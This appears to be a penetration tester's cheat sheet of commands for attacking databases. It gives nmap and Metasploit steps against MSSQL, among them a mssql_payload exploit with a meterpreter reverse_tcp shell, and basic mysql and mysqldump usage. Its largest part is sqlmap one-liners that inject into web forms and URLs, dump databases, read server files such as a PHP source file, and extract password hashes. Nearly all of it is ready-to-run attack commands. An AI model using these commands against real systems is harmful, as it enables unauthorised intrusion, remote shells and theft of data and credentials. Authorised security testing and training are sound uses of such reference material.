# Enumeration / Discovery:
### Nmap:
```
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
```

### Metasploit:
```
msf > use auxiliary/scanner/mssql/mssql_ping
```
### Bruteforce MSSQL Login
```
msf > use auxiliary/admin/mssql/mssql_enum
```

### Metasploit MSSQL Shell
```
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```



# mysql 
### start the mysql databse program
```
sudo mysql 
```
### commands must end in a semicolon.
### Displays all installed databases
```
show databases;
```

### Connects to a specific database
```
use <db>;
```

### Displays all tables in a database
```
show tables;
```

### Displays column names for a given table.
```
describe <table>;
```

### Selects all records from \<table\>.
```
select * from <table>;
```

### Display all installed databases 
```
show databases;
```

## Dump mysql database to text file
### mysqldump
```
sudo mysqldump <table> > /path/to/file.sql
```

# SQLMap Examples
### A mini SQLMap cheat sheet:
Automated sqlmap scan
```
sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3						
```
Targeted sqlmap scan
```
sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php" 	
```
Scan url for union + error based  injection with mysql backend and use a random user agent + database dump
```
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
``` 								
sqlmap check form for injection
```
sqlmap -o -u "http://meh.com/form/" --forms
```
sqlmap dump and crack hashes for table users on database-name.
```
sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump
```


